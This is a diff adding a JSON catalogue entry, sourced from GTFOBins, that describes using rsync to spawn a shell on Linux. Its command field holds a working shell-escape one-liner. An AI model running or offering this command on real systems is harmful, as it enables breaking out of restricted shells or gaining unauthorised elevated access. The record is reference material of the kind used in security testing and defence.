@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-rsync-shell",
+  "name": "GTFOBins · rsync (shell)",
+  "command": "rsync -e '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' x:x",
+  "description": "Use rsync to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "rsync",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/rsync/#shell",
+  "upstream_id": "rsync/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/rsync/"
+    }
+  ]
+}
